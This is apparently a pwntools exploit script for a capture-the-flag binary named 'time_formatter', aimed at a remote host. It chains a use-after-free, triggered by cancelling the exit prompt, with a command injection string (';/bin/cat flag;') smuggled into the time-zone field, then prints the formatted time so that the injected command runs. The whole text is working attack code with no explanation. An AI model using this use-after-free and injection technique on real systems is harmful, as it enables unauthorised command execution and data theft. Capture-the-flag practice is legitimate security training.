from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./time_formatter"
# libc_binary = "./"

p = process(argv=[binary])
p = remote("220.249.52.133", 42952)

elf = ELF(binary)
# libc = ELF(libc_binary)

context.arch = "amd64"

def set_time_format(val):
    p.sendlineafter("> ","1")
    p.sendlineafter("Format: ",val)

def exit_uaf():
    p.sendlineafter("> ","5")
    p.sendlineafter("Are you sure you want to exit (y/N)?","N")

def set_time_zone():
    p.sendlineafter("> ","3")
    p.sendlineafter("Time zone:","';/bin/cat flag;'")

def vuln_printf():
    p.sendlineafter("> ","4")

set_time_format("AAAA")
exit_uaf()
set_time_zone()
vuln_printf()

p.interactive()
